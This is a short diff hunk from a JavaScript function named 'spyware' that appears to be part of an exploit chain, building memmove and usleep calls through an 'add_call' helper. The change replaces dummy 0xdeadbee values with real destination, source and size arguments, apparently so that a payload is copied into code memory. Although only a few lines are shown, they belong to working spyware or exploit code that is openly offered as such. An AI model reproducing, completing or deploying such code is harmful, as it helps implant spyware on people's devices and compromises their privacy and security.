@@ -688,12 +688,9 @@ function spyware(stage1, memory, binary)
     );
 
     add_call(memmove,
-        // codeAddr,           // dst
-        // paddr,              // src
-        // shsz                // size
-        new Int64(0xdeadbee4),
-        new Int64(0xdeadbee5),
-        new Int64(0xdeadbee6)
+        codeAddr,           // dst
+        paddr,              // src
+        shsz                // size
     );
 
     add_call(usleep,
